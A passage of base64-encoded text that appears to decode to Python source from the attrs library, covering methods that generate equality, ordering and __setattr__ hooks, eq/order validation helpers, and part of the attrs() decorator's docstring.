CAgICAgc2VsZi5fY2FjaGVfaGFzaCxcbiAgICAgICAgICAgICAgICBzZWxmLl9iYXNlX2F0dHJfbWFwLFxuICAgICAgICAgICAgICAgIHNlbGYuX2lzX2V4YyxcbiAgICAgICAgICAgICAgICBzZWxmLl9vbl9zZXRhdHRyLFxuICAgICAgICAgICAgICAgIGF0dHJzX2luaXQ9VHJ1ZSxcbiAgICAgICAgICAgIClcbiAgICAgICAgKVxuXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgYWRkX2VxKHNlbGYpOlxuICAgICAgICBjZCA9IHNlbGYuX2Nsc19kaWN0XG5cbiAgICAgICAgY2RbIl9fZXFfXyJdID0gc2VsZi5fYWRkX21ldGhvZF9kdW5kZXJzKFxuICAgICAgICAgICAgX21ha2VfZXEoc2VsZi5fY2xzLCBzZWxmLl9hdHRycylcbiAgICAgICAgKVxuICAgICAgICBjZFsiX19uZV9fIl0gPSBzZWxmLl9hZGRfbWV0aG9kX2R1bmRlcnMoX21ha2VfbmUoKSlcblxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIGFkZF9vcmRlcihzZWxmKTpcbiAgICAgICAgY2QgPSBzZWxmLl9jbHNfZGljdFxuXG4gICAgICAgIGNkWyJfX2x0X18iXSwgY2RbIl9fbGVfXyJdLCBjZFsiX19ndF9fIl0sIGNkWyJfX2dlX18iXSA9IChcbiAgICAgICAgICAgIHNlbGYuX2FkZF9tZXRob2RfZHVuZGVycyhtZXRoKVxuICAgICAgICAgICAgZm9yIG1ldGggaW4gX21ha2Vfb3JkZXIoc2VsZi5fY2xzLCBzZWxmLl9hdHRycylcbiAgICAgICAgKVxuXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgYWRkX3NldGF0dHIoc2VsZik6XG4gICAgICAgIGlmIHNlbGYuX2Zyb3plbjpcbiAgICAgICAgICAgIHJldHVybiBzZWxmXG5cbiAgICAgICAgc2FfYXR0cnMgPSB7fVxuICAgICAgICBmb3IgYSBpbiBzZWxmLl9hdHRyczpcbiAgICAgICAgICAgIG9uX3NldGF0dHIgPSBhLm9uX3NldGF0dHIgb3Igc2VsZi5fb25fc2V0YXR0clxuICAgICAgICAgICAgaWYgb25fc2V0YXR0ciBhbmQgb25fc2V0YXR0ciBpcyBub3Qgc2V0dGVycy5OT19PUDpcbiAgICAgICAgICAgICAgICBzYV9hdHRyc1thLm5hbWVdID0gYSwgb25fc2V0YXR0clxuXG4gICAgICAgIGlmIG5vdCBzYV9hdHRyczpcbiAgICAgICAgICAgIHJldHVybiBzZWxmXG5cbiAgICAgICAgaWYgc2VsZi5faGFzX2N1c3RvbV9zZXRhdHRyOlxuICAgICAgICAgICAgIyBXZSBuZWVkIHRvIHdyaXRlIGEgX19zZXRhdHRyX18gYnV0IHRoZXJlIGFscmVhZHkgaXMgb25lIVxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAiQ2FuXCd0IGNvbWJpbmUgY3VzdG9tIF9fc2V0YXR0cl9fIHdpdGggb25fc2V0YXR0ciBob29rcy4iXG4gICAgICAgICAgICApXG5cbiAgICAgICAgIyBkb2NzdHJpbmcgY29tZXMgZnJvbSBfYWRkX21ldGhvZF9kdW5kZXJzXG4gICAgICAgIGRlZiBfX3NldGF0dHJfXyhzZWxmLCBuYW1lLCB2YWwpOlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGEsIGhvb2sgPSBzYV9hdHRyc1tuYW1lXVxuICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOlxuICAgICAgICAgICAgICAgIG52YWwgPSB2YWxcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgbnZhbCA9IGhvb2soc2VsZiwgYSwgdmFsKVxuXG4gICAgICAgICAgICBfb2JqX3NldGF0dHIoc2VsZiwgbmFtZSwgbnZhbClcblxuICAgICAgICBzZWxmLl9jbHNfZGljdFsiX19hdHRyc19vd25fc2V0YXR0cl9fIl0gPSBUcnVlXG4gICAgICAgIHNlbGYuX2Nsc19kaWN0WyJfX3NldGF0dHJfXyJdID0gc2VsZi5fYWRkX21ldGhvZF9kdW5kZXJzKF9fc2V0YXR0cl9fKVxuICAgICAgICBzZWxmLl93cm90ZV9vd25fc2V0YXR0ciA9IFRydWVcblxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIF9hZGRfbWV0aG9kX2R1bmRlcnMoc2VsZiwgbWV0aG9kKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEFkZCBfX21vZHVsZV9fIGFuZCBfX3F1YWxuYW1lX18gdG8gYSAqbWV0aG9kKiBpZiBwb3NzaWJsZS5cbiAgICAgICAgIiIiXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIG1ldGhvZC5fX21vZHVsZV9fID0gc2VsZi5fY2xzLl9fbW9kdWxlX19cbiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgcGFzc1xuXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIG1ldGhvZC5fX3F1YWxuYW1lX18gPSAiLiIuam9pbihcbiAgICAgICAgICAgICAgICAoc2VsZi5fY2xzLl9fcXVhbG5hbWVfXywgbWV0aG9kLl9fbmFtZV9fKVxuICAgICAgICAgICAgKVxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICBwYXNzXG5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgbWV0aG9kLl9fZG9jX18gPSAiTWV0aG9kIGdlbmVyYXRlZCBieSBhdHRycyBmb3IgY2xhc3MgJXMuIiAlIChcbiAgICAgICAgICAgICAgICBzZWxmLl9jbHMuX19xdWFsbmFtZV9fLFxuICAgICAgICAgICAgKVxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICBwYXNzXG5cbiAgICAgICAgcmV0dXJuIG1ldGhvZFxuXG5cbl9DTVBfREVQUkVDQVRJT04gPSAoXG4gICAgIlRoZSB1c2FnZSBvZiBgY21wYCBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGJlIHJlbW92ZWQgb24gb3IgYWZ0ZXIgIlxuICAgICIyMDIxLTA2LTAxLiAgUGxlYXNlIHVzZSBgZXFgIGFuZCBgb3JkZXJgIGluc3RlYWQuIlxuKVxuXG5cbmRlZiBfZGV0ZXJtaW5lX2F0dHJzX2VxX29yZGVyKGNtcCwgZXEsIG9yZGVyLCBkZWZhdWx0X2VxKTpcbiAgICAiIiJcbiAgICBWYWxpZGF0ZSB0aGUgY29tYmluYXRpb24gb2YgKmNtcCosICplcSosIGFuZCAqb3JkZXIqLiBEZXJpdmUgdGhlIGVmZmVjdGl2ZVxuICAgIHZhbHVlcyBvZiBlcSBhbmQgb3JkZXIuICBJZiAqZXEqIGlzIE5vbmUsIHNldCBpdCB0byAqZGVmYXVsdF9lcSouXG4gICAgIiIiXG4gICAgaWYgY21wIGlzIG5vdCBOb25lIGFuZCBhbnkoKGVxIGlzIG5vdCBOb25lLCBvcmRlciBpcyBub3QgTm9uZSkpOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJEb25cJ3QgbWl4IGBjbXBgIHdpdGggYGVxXCcgYW5kIGBvcmRlcmAuIilcblxuICAgICMgY21wIHRha2VzIHByZWNlZGVuY2UgZHVlIHRvIGJ3LWNvbXBhdGliaWxpdHkuXG4gICAgaWYgY21wIGlzIG5vdCBOb25lOlxuICAgICAgICByZXR1cm4gY21wLCBjbXBcblxuICAgICMgSWYgbGVmdCBOb25lLCBlcXVhbGl0eSBpcyBzZXQgdG8gdGhlIHNwZWNpZmllZCBkZWZhdWx0IGFuZCBvcmRlcmluZ1xuICAgICMgbWlycm9ycyBlcXVhbGl0eS5cbiAgICBpZiBlcSBpcyBOb25lOlxuICAgICAgICBlcSA9IGRlZmF1bHRfZXFcblxuICAgIGlmIG9yZGVyIGlzIE5vbmU6XG4gICAgICAgIG9yZGVyID0gZXFcblxuICAgIGlmIGVxIGlzIEZhbHNlIGFuZCBvcmRlciBpcyBUcnVlOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJgb3JkZXJgIGNhbiBvbmx5IGJlIFRydWUgaWYgYGVxYCBpcyBUcnVlIHRvby4iKVxuXG4gICAgcmV0dXJuIGVxLCBvcmRlclxuXG5cbmRlZiBfZGV0ZXJtaW5lX2F0dHJpYl9lcV9vcmRlcihjbXAsIGVxLCBvcmRlciwgZGVmYXVsdF9lcSk6XG4gICAgIiIiXG4gICAgVmFsaWRhdGUgdGhlIGNvbWJpbmF0aW9uIG9mICpjbXAqLCAqZXEqLCBhbmQgKm9yZGVyKi4gRGVyaXZlIHRoZSBlZmZlY3RpdmVcbiAgICB2YWx1ZXMgb2YgZXEgYW5kIG9yZGVyLiAgSWYgKmVxKiBpcyBOb25lLCBzZXQgaXQgdG8gKmRlZmF1bHRfZXEqLlxuICAgICIiIlxuICAgIGlmIGNtcCBpcyBub3QgTm9uZSBhbmQgYW55KChlcSBpcyBub3QgTm9uZSwgb3JkZXIgaXMgbm90IE5vbmUpKTpcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRG9uXCd0IG1peCBgY21wYCB3aXRoIGBlcVwnIGFuZCBgb3JkZXJgLiIpXG5cbiAgICBkZWYgZGVjaWRlX2NhbGxhYmxlX29yX2Jvb2xlYW4odmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgRGVjaWRlIHdoZXRoZXIgYSBrZXkgZnVuY3Rpb24gaXMgdXNlZC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIGNhbGxhYmxlKHZhbHVlKTpcbiAgICAgICAgICAgIHZhbHVlLCBrZXkgPSBUcnVlLCB2YWx1ZVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAga2V5ID0gTm9uZVxuICAgICAgICByZXR1cm4gdmFsdWUsIGtleVxuXG4gICAgIyBjbXAgdGFrZXMgcHJlY2VkZW5jZSBkdWUgdG8gYnctY29tcGF0aWJpbGl0eS5cbiAgICBpZiBjbXAgaXMgbm90IE5vbmU6XG4gICAgICAgIGNtcCwgY21wX2tleSA9IGRlY2lkZV9jYWxsYWJsZV9vcl9ib29sZWFuKGNtcClcbiAgICAgICAgcmV0dXJuIGNtcCwgY21wX2tleSwgY21wLCBjbXBfa2V5XG5cbiAgICAjIElmIGxlZnQgTm9uZSwgZXF1YWxpdHkgaXMgc2V0IHRvIHRoZSBzcGVjaWZpZWQgZGVmYXVsdCBhbmQgb3JkZXJpbmdcbiAgICAjIG1pcnJvcnMgZXF1YWxpdHkuXG4gICAgaWYgZXEgaXMgTm9uZTpcbiAgICAgICAgZXEsIGVxX2tleSA9IGRlZmF1bHRfZXEsIE5vbmVcbiAgICBlbHNlOlxuICAgICAgICBlcSwgZXFfa2V5ID0gZGVjaWRlX2NhbGxhYmxlX29yX2Jvb2xlYW4oZXEpXG5cbiAgICBpZiBvcmRlciBpcyBOb25lOlxuICAgICAgICBvcmRlciwgb3JkZXJfa2V5ID0gZXEsIGVxX2tleVxuICAgIGVsc2U6XG4gICAgICAgIG9yZGVyLCBvcmRlcl9rZXkgPSBkZWNpZGVfY2FsbGFibGVfb3JfYm9vbGVhbihvcmRlcilcblxuICAgIGlmIGVxIGlzIEZhbHNlIGFuZCBvcmRlciBpcyBUcnVlOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJgb3JkZXJgIGNhbiBvbmx5IGJlIFRydWUgaWYgYGVxYCBpcyBUcnVlIHRvby4iKVxuXG4gICAgcmV0dXJuIGVxLCBlcV9rZXksIG9yZGVyLCBvcmRlcl9rZXlcblxuXG5kZWYgX2RldGVybWluZV93aGV0aGVyX3RvX2ltcGxlbWVudChcbiAgICBjbHMsIGZsYWcsIGF1dG9fZGV0ZWN0LCBkdW5kZXJzLCBkZWZhdWx0PVRydWVcbik6XG4gICAgIiIiXG4gICAgQ2hlY2sgd2hldGhlciB3ZSBzaG91bGQgaW1wbGVtZW50IGEgc2V0IG9mIG1ldGhvZHMgZm9yICpjbHMqLlxuXG4gICAgKmZsYWcqIGlzIHRoZSBhcmd1bWVudCBwYXNzZWQgaW50byBAYXR0ci5zIGxpa2UgXCdpbml0XCcsICphdXRvX2RldGVjdCogdGhlXG4gICAgc2FtZSBhcyBwYXNzZWQgaW50byBAYXR0ci5zIGFuZCAqZHVuZGVycyogaXMgYSB0dXBsZSBvZiBhdHRyaWJ1dGUgbmFtZXNcbiAgICB3aG9zZSBwcmVzZW5jZSBzaWduYWwgdGhhdCB0aGUgdXNlciBoYXMgaW1wbGVtZW50ZWQgaXQgdGhlbXNlbHZlcy5cblxuICAgIFJldHVybiAqZGVmYXVsdCogaWYgbm8gcmVhc29uIGZvciBlaXRoZXIgZm9yIG9yIGFnYWluc3QgaXMgZm91bmQuXG5cbiAgICBhdXRvX2RldGVjdCBtdXN0IGJlIEZhbHNlIG9uIFB5dGhvbiAyLlxuICAgICIiIlxuICAgIGlmIGZsYWcgaXMgVHJ1ZSBvciBmbGFnIGlzIEZhbHNlOlxuICAgICAgICByZXR1cm4gZmxhZ1xuXG4gICAgaWYgZmxhZyBpcyBOb25lIGFuZCBhdXRvX2RldGVjdCBpcyBGYWxzZTpcbiAgICAgICAgcmV0dXJuIGRlZmF1bHRcblxuICAgICMgTG9naWNhbGx5LCBmbGFnIGlzIE5vbmUgYW5kIGF1dG9fZGV0ZWN0IGlzIFRydWUgaGVyZS5cbiAgICBmb3IgZHVuZGVyIGluIGR1bmRlcnM6XG4gICAgICAgIGlmIF9oYXNfb3duX2F0dHJpYnV0ZShjbHMsIGR1bmRlcik6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiBkZWZhdWx0XG5cblxuZGVmIGF0dHJzKFxuICAgIG1heWJlX2Nscz1Ob25lLFxuICAgIHRoZXNlPU5vbmUsXG4gICAgcmVwcl9ucz1Ob25lLFxuICAgIHJlcHI9Tm9uZSxcbiAgICBjbXA9Tm9uZSxcbiAgICBoYXNoPU5vbmUsXG4gICAgaW5pdD1Ob25lLFxuICAgIHNsb3RzPUZhbHNlLFxuICAgIGZyb3plbj1GYWxzZSxcbiAgICB3ZWFrcmVmX3Nsb3Q9VHJ1ZSxcbiAgICBzdHI9RmFsc2UsXG4gICAgYXV0b19hdHRyaWJzPUZhbHNlLFxuICAgIGt3X29ubHk9RmFsc2UsXG4gICAgY2FjaGVfaGFzaD1GYWxzZSxcbiAgICBhdXRvX2V4Yz1GYWxzZSxcbiAgICBlcT1Ob25lLFxuICAgIG9yZGVyPU5vbmUsXG4gICAgYXV0b19kZXRlY3Q9RmFsc2UsXG4gICAgY29sbGVjdF9ieV9tcm89RmFsc2UsXG4gICAgZ2V0c3RhdGVfc2V0c3RhdGU9Tm9uZSxcbiAgICBvbl9zZXRhdHRyPU5vbmUsXG4gICAgZmllbGRfdHJhbnNmb3JtZXI9Tm9uZSxcbiAgICBtYXRjaF9hcmdzPVRydWUsXG4pOlxuICAgIHIiIiJcbiAgICBBIGNsYXNzIGRlY29yYXRvciB0aGF0IGFkZHMgYGR1bmRlclxuICAgIDxodHRwczovL3dpa2kucHl0aG9uLm9yZy9tb2luL0R1bmRlckFsaWFzPmBfXFwgLW1ldGhvZHMgYWNjb3JkaW5nIHRvIHRoZVxuICAgIHNwZWNpZmllZCBhdHRyaWJ1dGVzIHVzaW5nIGBhdHRyLmliYCBvciB0aGUgKnRoZXNlKiBhcmd1bWVudC5cblxuICAgIDpwYXJhbSB0aGVzZTogQSBkaWN0aW9uYXJ5IG9mIG5hbWUgdG8gYGF0dHIuaWJgIG1hcHBpbmdzLiAgVGhpcyBpc1xuICAgICAgICB1c2VmdWwgdG8gYXZvaWQgdGhlIGRlZmluaXRpb24gb2YgeW91ciBhdHRyaWJ1dGVzIHdpdGhpbiB0aGUgY2xhc3MgYm9keVxuICAgICAgICBiZWNhdXNlIHlvdSBjYW5cJ3QgKGUuZy4gaWYgeW91IHdhbnQgdG8gYWRkIGBgX19yZXByX19gYCBtZXRob2RzIHRvXG4gICAgICAgIERqYW5nbyBtb2RlbHMpIG9yIGRvblwndCB3YW50IHRvLlxuXG4gICAgICAgIElmICp0aGVzZSogaXMgbm90IGBgTm9uZWBgLCBgYGF0dHJzYGAgd2lsbCAqbm90KiBzZWFyY2ggdGhlIGNsYXNzIGJvZHlcbiAgICAgICAgZm9yIGF0dHJpYnV0ZXMgYW5kIHdpbGwgKm5vdCogcmVtb3ZlIGFueSBhdHRyaWJ1dGVzIGZyb20gaXQuXG5cbiAgICAgICAgSWYgKnRoZXNlKiBpcyBhbiBvcmRlcmVkIGRpY3QgKGBkaWN0YCBvbiBQeXRob24gMy42KyxcbiAgICAgICAgYGNvbGxlY3Rpb25zLk9yZGVyZWREaWN0YCBvdGhlcndpc2UpLCB0aGUgb3JkZXIgaXMgZGVkdWNlZCBmcm9tXG4gICAgICAgIHRoZSBvcmRlciBvZiB0aGUgYXR0cmlidXRlcyBpbnNpZGUgKnRoZXNlKi4gIE90aGVyd2lzZSB0aGUgb3JkZXJcbiAgICAgICAgb2YgdGhlIGRlZmluaXRpb24gb2YgdGhlIGF0dHJpYnV0ZXMgaXMgdXNlZC5cblxuICAgIDp0eXBlIHRoZXNlOiBgZGljdGAgb2YgYHN0cmAgdG8gYGF0dHIuaWJgXG5cbiAgICA6cGFyYW0gc3RyIHJlcHJfbnM6IFdoZW4gdXNpbmcgbmVzdGVkIGNsYXNzZXMsIHRoZXJlXCdzIG5vIHdheSBpbiBQeXRob24gMlxuICAgICAgICB0byBhdXRvbWF0aWNhbGx5IGRldGVjdCB0aGF0LiAgVGhlcmVmb3JlIGl0XCdzIHBvc3NpYmxlIHRvIHNldCB0aGVcbiAgICAgICAgbmFtZXNwYWNlIGV4cGxpY2l0bHkgZm9yIGEgbW9yZSBtZWFuaW5nZnVsIGBgcmVwcmBgIG91dHB1dC5cbiAgICA6cGFyYW0gYm9vbCBhdXRvX2RldGVjdDogSW5zdGVhZCBvZiBzZXR0aW5nIHRoZSAqaW5pdCosICpyZXByKiwgKmVxKixcbiAgICAgICAgKm9yZGVyKiwgYW5kICpoYXNoKiBhcmd1bWVudHMgZXhwbGljaXRseSwgYXNzdW1lIHRoZXkgYXJlIHNldCB0b1xuICAgICAgICBgYFRydWVgYCAqKnVubGVzcyBhbnkqKiBvZiB0aGUgaW52b2x2ZWQgbWV0aG9kcyBmb3Igb25lIG9mIHRoZVxuICAgICAgICBhcmd1bWVudHMgaXMgaW1wbGVtZW50ZWQgaW4gdGhlICpjdXJyZW50KiBjbGFzcyAoaS5lLiBpdCBpcyAqbm90KlxuICAgICAgICBpbmhlcml0ZWQgZnJvbSBzb21lIGJhc2UgY2xhc3MpLlxuXG4gICAgICAgIFNvIGZvciBleGFtcGxlIGJ5IGltcGxlbWVudGluZyBgYF9fZXFfX2BgIG9uIGEgY2xhc3MgeW91cnNlbGYsXG4gICAgICAgIGBgYXR0cnNgYCB3aWxsIGRlZHVjZSBgYGVxPUZhbHNlYGAgYW5kIHdpbGwgY3JlYXRlICpuZWl0aGVyKlxuICAgICAgICBgYF9fZXFfX2BgICpub3IqIGBgX19uZV9fYGAgKGJ1dCBQeXRob24gY2xhc3NlcyBjb21lIHdpdGggYSBzZW5zaWJsZVxuICAgICAgICBgYF9fbmVfX2BgIGJ5IGRlZmF1bHQsIHNvIGl0ICpzaG91bGQqIGJlIGVub3VnaCB0byBvbmx5IGltcGxlbWVudFxuICAgICAgICBgYF9fZXFfX2BgIGluIG1vc3QgY2FzZXMpLlxuXG4gICAgICAgIC4uIHdhcm5pbmc6OlxuXG4gICAgICAgICAgIElmIHlvdSBwcmV2ZW50IGBgYXR0cnNgYCBmcm9tIGNyZWF0aW5nIHRoZSBvcmRlcmluZyBtZXRob2RzIGZvciB5b3VcbiAgICAgICAgICAgKGBgb3JkZXI9RmFsc2VgYCwgZS5nLiBieSBpbXBsZW1lbnRpbmcgYGBfX2xlX19gYCksIGl0IGJlY29tZXNcbiAgICAgICAgICAgKnlvdXIqIHJlc3BvbnNpYmlsaXR5IHRvIG1ha2Ugc3VyZSBpdHMgb3JkZXJpbmcgaXMgc291bmQuIFRoZSBiZXN0XG4gICAgICAgICAgIHdheSBpcyB0byB1c2UgdGhlIGBmdW5jdG9vbHMudG90YWxfb3JkZXJpbmdgIGRlY29yYXRvci5cblxuXG4gICAgICAgIFBhc3NpbmcgYGBUcnVlYGAgb3IgYGBGYWxzZWBgIHRvICppbml0KiwgKnJlcHIqLCAqZXEqLCAqb3JkZXIqLFxuICAgICAgICAqY21wKiwgb3IgKmhhc2gqIG92ZXJyaWRlcyB3aGF0ZXZlciAqYXV0b19kZXRlY3QqIHdvdWxkIGRldGVybWluZS5cblxuICAgICAgICAqYXV0b19kZXRlY3QqIHJlcXVpcmVzIFB5dGhvbiAzLiBTZXR0aW5nIGl0IGBgVHJ1ZWBgIG9uIFB5dGhvbiAyIHJhaXNlc1xuICAgICAgICBhbiBgYXR0cnMuZXhjZXB0aW9ucy5QeXRob25Ub29PbGRFcnJvcmAuXG5cbiAgICA6cGFyYW0gYm9vbCByZXByOiBDcmVhdGUgYSBgYF9fcmVwcl9fYGAgbWV0aG9kIHdpdGggYSBodW1hbiByZWFkYWJsZVxuICAgICAgICByZXByZXNlbnRhdGlvbiBvZiBgYGF0dHJzYGAgYXR0cmlidXRlcy4uXG4gICAgOnBhcmFtIGJvb2wgc3RyOiBDcmVhdGUgYSBgYF9fc3RyX19gYCBtZXRob2QgdGhhdCBpcyBpZGVudGljYWwgdG9cbiAgICAgICAgYGBfX3JlcHJfX2BgLiAgVGhpcyBpcyB1c3VhbGx5IG5vdCBuZWNlc3NhcnkgZXhjZXB0IGZvclxuICAgICAgICBgRXhjZXB0aW9uYFxcIHMuXG4gICAgOnBhcmFtIE9wdGlvbmFsW2Jvb2xdIGVxOiBJZiBgYFRydWVgYCBvciBgYE5vbmVgYCAoZGVmYXVsdCksIGFkZCBgYF9fZXFfX2BgXG4gICAgICAgIGFuZCBgYF9fbmVfX2BgIG1ldGhvZHMgdGhhdCBjaGVjayB0d28gaW5zdGFuY2VzIGZvciBlcXVhbGl0eS5cblxuICAgICAgICBUaGV5IGNvbXBhcmUgdGhlIGluc3RhbmNlcyBhcyBpZiB0aGV5IHdlcmUgdHVwbGVzIG9mIHRoZWlyIGBgYXR0cnNgYFxuICAgICAgICBhdHRyaWJ1dGVzIGlmIGFuZCBvbmx5IGlmIHRoZSB0eXBlcyBvZiBib3RoIGNsYXNzZXMgYXJlICppZGVudGljYWwqIVxuICAgIDpwYXJhbSBPcHRpb25hbFtib29sXSBvcmRlcjogSWYgYGBUcnVlYGAsIGFkZCBgYF9fbHRfX2BgLCBgYF9fbGVfX2BgLFxuICAgICAgICBgYF9fZ3RfX2BgLCBhbmQgYGBfX2dlX19gYCBtZXRob2RzIHRoYXQgYmVoYXZlIGxpa2UgKmVxKiBhYm92ZSBhbmRcbiAgICAgICAgYWxsb3cgaW5zdGFuY2VzIHRvIGJlIG9yZGVyZWQuIElmIGBgTm9uZWBgIChkZWZhdWx0KSBtaXJyb3IgdmFsdWUgb2ZcbiAgICAgICAgKmVxKi5cbiAgICA6cGFyYW0gT3B0aW9uYWxbYm9vbF0gY21wOiBTZXR0aW5nICpjbXAqIGlzIGVxdWl2YWxlbnQgdG8gc2V0dGluZyAqZXEqXG4gICAgICAgIGFuZCAqb3JkZXIqIHRvIHRoZSBzYW1lIHZhbHVlLiBNdXN0IG5vdCBiZSBtaXhlZCB3aXRoICplcSogb3IgKm9yZGVyKi5cbiAgICA6cGFyYW0gT3B0aW9uYWxbYm9vbF0gaGFzaDogSWYgYGBOb25lYGAgKGRlZmF1bHQpLCB0aGUgYGBfX2hhc2hfX2BgIG1ldGhvZFxuICAgICAgICBpcyBnZW5lcmF0ZWQgYWNjb3JkaW5nIGhvdyAqZXEqIGFuZCAqZnJvemVuKiBhcmUgc2V0LlxuXG4gICAgICAgIDEuIElmICpib3RoKiBhcmUgVHJ1ZSwgYGBhdHRyc2BgIHdpbGwgZ2VuZXJhdGUgYSBgYF9faGFzaF9fYGAgZm9yIHlvdS5cbiAgICAgICAgMi4gSWYgKmVxKiBpcyBUcnVlIGFuZCAqZnJvemVuKiBpcyBGYWxzZSwgYGBfX2hhc2hfX2BgIHdpbGwgYmUgc2V0IHRvXG4gICAgICAgICAgIE5vbmUsIG1hcmtpbmcgaXQgdW5oYXNoYWJsZSAod2hpY2ggaXQgaXMpLlxuICAgICAgICAzLiBJZiAqZXEqIGlzIEZhbHNlLCBgYF9faGFzaF9fYGAgd2lsbCBiZSBsZWZ0IHVudG91Y2hlZCBtZWFuaW5nIHRoZVxuICAgICAgICAgICBgYF9faGFzaF9fYGAgbWV0aG9kIG9mIHRoZSBiYXNlIGNsYXNzIHdpbGwgYmUgdXNlZCAoaWYgYmFzZSBjbGFzcyBpc1xuICAgICAgICAgICBgYG9iamVjdGBgLCB0aGlzIG1lYW5zIGl0IHdpbGwgZmFsbCBiYWNrIHRvIGlkLWJhc2VkIGhhc2hpbmcuKS5cblxuICAgICAgICBBbHRob3VnaCBub3QgcmVjb21tZW5kZWQsIHlvdSBjYW4gZGVjaWRlIGZvciB5b3Vyc2VsZiBhbmQgZm9yY2VcbiAgICAgICAgYGBhdHRyc2BgIHRvIGNyZWF0ZSBvbmUgKGUuZy4gaWYgdGhlIGNsYXNzIGlzIGltbXV0YWJsZSBldmVuIHRob3VnaCB5b3VcbiAgICAgICAgZGlkblwndCBmcmVlemUgaXQgcHJvZ3JhbW1hdGljYWxseSkgYnkgcGFzc2luZyBgYFRydWVgYCBvciBub3QuICBCb3RoIG9mXG4gICAgICAgIHRoZXNlIGNhc2VzIGFyZSByYXRoZXIgc3BlY2lhbCBhbmQgc2hvdWxkIGJlIHVzZWQgY2FyZWZ1bGx5LlxuXG4gICAgICAgIFNlZSBvdXIgZG9jdW1lbnRhdGlvbiBvbiBgaGFzaGluZ2AsIFB5dGhvblwncyBkb2N1bWVudGF0aW9uIG9uXG4gICAgICAgIGBvYmplY3QuX19oYXNoX19gLCBhbmQgdGhlIGBHaXRIdWIgaXNzdWUgdGhhdCBsZWQgdG8gdGhlIGRlZmF1bHQgXFxcbiAgICAgICAgYmVoYXZpb3IgPGh0dHBzOi8vZ2l0aHViLmNvbS9weXRob24tYXR0cnMvYXR0cnMvaXNzdWVzLzEzNj5gXyBmb3IgbW9yZVxuICAgICAgICBkZXRhaWxzLlxuICAgIDpwYXJhbSBib29sIGluaXQ6IENyZWF0ZSBhIGBgX19pbml0X19gYCBtZXRob2QgdGhhdCBpbml0aWFsaXplcyB0aGVcbiAgICAgICAgYGBhdHRyc2BgIGF0dHJpYnV0ZXMuIExlYWRpbmcgdW5kZXJzY29yZXMgYXJlIHN0cmlwcGVkIGZvciB0aGUgYXJndW1lbnRcbiAgICAgICAgbmFtZS4gSWYgYSBgYF9fYXR0cnNfcHJlX2luaXRfX2BgIG1ldGhvZCBleGlzdHMgb24gdGhlIGNsYXNzLCBpdCB3aWxsXG4gICAgICAgIGJlIGNhbGxlZCBiZWZvcmUgdGhlIGNsYXNzIGlzIGluaXRpYWxpemVkLiBJZiBhIGBgX19hdHRyc19wb3N0X2luaXRfX2BgXG4gICAgICAgIG1ldGhvZCBleGlzdHMgb24gdGhlIGNsYXNzLCBpdCB3aWxsIGJlIGNhbGxlZCBhZnRlciB0aGUgY2xhc3MgaXMgZnVsbHlcbiAgICAgICAgaW5pdGlhbGl6ZWQuXG5cbiAgICAgICAgSWYgYGBpbml0YGAgaXMgYGBGYWxzZWBgLCBhbiBgYF9fYXR0cnNfaW5pdF9fYGAgbWV0aG9kIHdpbGwgYmVcbiAgICAgICAgaW5qZWN0ZWQgaW5zdGVhZC4gVGhpcyBhbGxvd3MgeW91IHRvIGRlZmluZSBhIGN1c3RvbSBgYF9faW5pdF9fYGBcbiAgICAgICAgbWV0aG9kIHRoYXQgY2FuIGRvIHByZS1pbml0IHdvcmsgc3VjaCBhcyBgYHN1cGVyKCkuX19pbml0X18oKWBgLFxuICAgICAgICBhbmQgdGhlbiBjYWxsIGBgX19hdHRyc19pbml0X18oKWBgIGFuZCBgYF9fYXR0cnNfcG9zdF9pbml0X18oKWBgLlxuICAgIDpwYXJhbSBib29sIHNsb3RzOiBDcmVhdGUgYSBgc2xvdHRlZCBjbGFzcyA8c2xvdHRlZCBjbGFzc2VzPmAgdGhhdFwncyBtb3JlXG4gICAgICAgIG1lbW9yeS1lZmZpY2llbnQuIFNsb3R0ZWQgY2xhc3NlcyBhcmUgZ2VuZXJhbGx5IHN1cGVyaW9yIHRvIHRoZSBkZWZhdWx0XG4gICAgICAgIGRpY3QgY2xhc3NlcywgYnV0IGhhdmUgc29tZSBnb3RjaGFzIHlvdSBzaG91bGQga25vdyBhYm91dCwgc28gd2VcbiAgICAgICAgZW5jb3VyYWdlIHlvdSB0byByZWFkIHRoZSBgZ2xvc3NhcnkgZW50cnkgPHNsb3R0ZWQgY2xhc3Nlcz5gLlxuICAgIDpwYXJhbSBib29sIGZyb3plbjogTWFrZSBpbnN0YW5jZXMgaW1tdXRhYmxlIGFmdGVyIGluaXRpYWxpemF0aW9uLiAgSWZcbiAgICAgICAgc29tZW9uZSBhdHRlbXB0cyB0byBtb2RpZnkgYSBmcm96ZW4gaW5zdGFuY2UsXG4gICAgICAgIGBhdHRyLmV4Y2VwdGlvbnMuRnJvemVuSW5zdGFuY2VFcnJvcmAgaXMgcmFpc2VkLlxuXG4gICAgICAgIC4uIG5vdGU6OlxuXG4gICAgICAgICAgICAxLi